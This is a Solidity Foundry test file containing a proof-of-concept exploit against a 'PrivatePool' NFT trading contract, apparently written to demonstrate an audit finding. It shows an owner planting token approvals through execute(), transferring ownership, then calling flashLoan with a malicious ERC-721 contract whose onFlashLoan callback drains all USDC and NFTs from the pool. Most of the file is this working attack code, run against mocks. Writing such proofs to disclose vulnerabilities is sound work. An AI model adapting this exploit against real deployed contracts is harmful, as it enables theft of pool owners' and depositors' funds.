// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/*
    Exploit PoC for PrivatePool “sticky approvals” + arbitrary-token flashLoan
    Scenario reproduced:

    1.  Bob (attacker) creates & owns a PrivatePool, deposits 5 NFTs + 500 USDC.
    2.  While still owner he calls execute() twice to make the pool grant him:
            • unlimited USDC allowance
            • setApprovalForAll for the real NFT collection
        These approvals live in the external token contracts, NOT in the pool.
    3.  Bob transfers/sells the pool-ownership NFT to Alice (ownership change).
    4.  Although no longer owner, Bob calls flashLoan() providing a malicious
        ERC-721 contract as “token” and as “receiver”.  
        During onFlashLoan() re-entrancy Bob drains all assets via the
        pre-planted approvals.
    5.  All ERC20 + NFTs are stolen, proving the vulnerability.

    This Foundry test compiles & runs with `forge test`.
*/

import "forge-std/Test.sol";
import {PrivatePool}          from "src/PrivatePool.sol";
import {ERC20}                from "solmate/tokens/ERC20.sol";
import {ERC721, ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";
import {IERC3156FlashBorrower} from "openzeppelin/interfaces/IERC3156FlashLender.sol";

// -----------------------------------------------------------------------------
//                               Helper / Mock contracts
// -----------------------------------------------------------------------------

contract MockFactory {
    // poolAddress(uint160) => owner
    mapping(uint256 => address) internal _owners;
    uint16 internal _protocolFeeRate;

    function setOwner(address pool, address owner) external {
        _owners[uint256(uint160(pool))] = owner;
    }

    // Needed by PrivatePool
    function ownerOf(uint256 id) external view returns (address) {
        return _owners[id];
    }

    // Needed by PrivatePool
    function protocolFeeRate() external view returns (uint16) {
        return _protocolFeeRate;
    }

    // helper
    function setProtocolFeeRate(uint16 newRate) external {
        _protocolFeeRate = newRate;
    }

    // allow receiving ETH
    receive() external payable {}
}

contract MockERC20 is ERC20 {
    constructor() ERC20("MockUSD Coin", "USDC", 6) {}

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

contract MockERC721 is ERC721 {
    constructor() ERC721("Mock NFT", "MNFT") {}

    function mint(address to, uint256 id) external {
        _mint(to, id);
    }

    // solmate ERC721 needs receiver implementation for safe transfers in tests
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

// -----------------------------------------------------------------------------
//                                 Malicious helper
// -----------------------------------------------------------------------------
interface IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata)
        external
        returns (bytes4);
}

/*
 * One contract serves double duty:
 *  – ERC-721 token contract that the pool thinks it is flash-lending.
 *  – IERC3156FlashBorrower callback where the actual theft happens.
 */
contract MaliciousToken is IERC3156FlashBorrower, IERC721Receiver {
    address public immutable pool;
    address public immutable attacker;
    MockERC20 public immutable usdc;
    MockERC721 public immutable realNft;

    // We only need ownership for tokenId 0
    mapping(uint256 => address) internal _owners;

    constructor(address _pool, address _attacker, MockERC20 _usdc, MockERC721 _realNft) {
        pool     = _pool;
        attacker = _attacker;
        usdc     = _usdc;
        realNft  = _realNft;

        // Make the pool appear as owner of tokenId 0 so that
        // availableForFlashLoan() returns true.
        _owners[0] = _pool;
    }

    // --- Minimal ERC-721 surface -------------------------------------------

    function ownerOf(uint256 tokenId) external view returns (address) {
        return _owners[tokenId];
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(from == _owners[tokenId], "not owner");
        _owners[tokenId] = to;

        // If the recipient is a contract we invoke onERC721Received to satisfy
        // the ERC721 spec – but we skip all other checks for brevity.
        if (to.code.length > 0) {
            IERC721Receiver(to).onERC721Received(msg.sender, from, tokenId, "");
        }
    }

    // --- Flash loan callback – actual exploit --------------------------------

    function onFlashLoan(
        address,               // initiator
        address,               // token (ignored)
        uint256,               // tokenId
        uint256,               // fee
        bytes calldata         // data
    ) external override returns (bytes32) {
        // Drain USDC using unlimited allowance granted earlier
        uint256 balance = usdc.balanceOf(pool);
        if (balance > 0) {
            usdc.transferFrom(pool, attacker, balance);
        }

        // Drain all 5 NFTs (ids 1–5) using setApprovalForAll granted earlier
        for (uint256 id = 1; id <= 5; id++) {
            try realNft.transferFrom(pool, attacker, id) {} catch {}
        }

        // Required return value per ERC-3156
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // accept ERC721 transfers
    function onERC721Received(address, address, uint256, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return this.onERC721Received.selector;
    }
}

// -----------------------------------------------------------------------------
//                                   Test contract
// -----------------------------------------------------------------------------
contract ExploitTest is Test {
    address attacker = address(0xB0B);
    address alice    = address(0xA11CE);

    MockFactory internal factory;
    MockERC20   internal usdc;
    MockERC721  internal nft;
    PrivatePool internal pool;
    MaliciousToken internal evilToken;

    uint256[] internal ids;

    function setUp() public {
        // ------------------ Deploy core contracts ---------------------------
        factory = new MockFactory();
        usdc    = new MockERC20();
        nft     = new MockERC721();

        // Dummy addresses for registry/oracle (unused in this PoC)
        address royaltyRegistry   = address(0x1234);
        address stolenNftOracle   = address(0x5678);

        pool = new PrivatePool(
            address(factory),
            royaltyRegistry,
            stolenNftOracle
        );

        // Initial owner is the attacker (Bob)
        factory.setOwner(address(pool), attacker);

        // Initialise pool – keep it simple, zero fees
        vm.prank(attacker);
        pool.initialize(
            address(usdc),               // base token
            address(nft),                // NFT collection
            1e18, 5e18,                  // virtual reserves
            0,                           // changeFee
            0,                           // feeRate
            bytes32(0),                  // merkleRoot
            false,                       // useStolenNftOracle
            false                        // payRoyalties
        );

        // -------------------- Set up pool liquidity -------------------------
        // mint assets to attacker
        usdc.mint(attacker, 500 * 1e6);                 // 500 USDC (6 dp)
        for (uint256 id = 1; id <= 5; id++) {
            nft.mint(attacker, id);
        }

        // approve transfers to the pool
        vm.startPrank(attacker);
        usdc.approve(address(pool), type(uint256).max);
        nft.setApprovalForAll(address(pool), true);

        uint256[] memory depositIds = new uint256[](5);
        for (uint256 i = 0; i < 5; i++) depositIds[i] = i + 1;

        pool.deposit(depositIds, 500 * 1e6);            // deposit assets
        vm.stopPrank();

        // ---------------- Plant unlimited approvals via execute() -----------
        vm.prank(attacker);
        pool.execute(
            address(usdc),
            abi.encodeWithSelector(ERC20.approve.selector, attacker, type(uint256).max)
        );

        vm.prank(attacker);
        pool.execute(
            address(nft),
            abi.encodeWithSelector(ERC721.setApprovalForAll.selector, attacker, true)
        );

        // ------------------- Transfer ownership to Alice --------------------
        factory.setOwner(address(pool), alice);

        // ------------------- Deploy malicious flash loan token --------------
        evilToken = new MaliciousToken(
            address(pool),
            attacker,
            usdc,
            nft
        );
    }

    function testExploitDrainsPool() public {
        // Preconditions – Pool owns everything, attacker owns nothing
        assertEq(usdc.balanceOf(address(pool)), 500 * 1e6,  "pool should hold USDC before");
        assertEq(usdc.balanceOf(attacker),            0,     "attacker USDC before");
        for (uint256 id = 1; id <= 5; id++) {
            assertEq(nft.ownerOf(id), address(pool),  "pool should own NFT before");
        }

        // ------------------------- Exploit ---------------------------------
        vm.prank(attacker);
        pool.flashLoan(
            IERC3156FlashBorrower(address(evilToken)), // receiver
            address(evilToken),                       // malicious token address
            0,                                        // fake tokenId
            ""                                        // data
        );

        // ------------------------- Post-conditions --------------------------
        // All assets left the pool
        assertEq(usdc.balanceOf(address(pool)), 0, "pool USDC drained");
        for (uint256 id = 1; id <= 5; id++) {
            assertEq(nft.ownerOf(id), attacker, "NFT stolen");
        }

        // Attacker received everything
        assertEq(usdc.balanceOf(attacker), 500 * 1e6, "attacker USDC after");
    }
}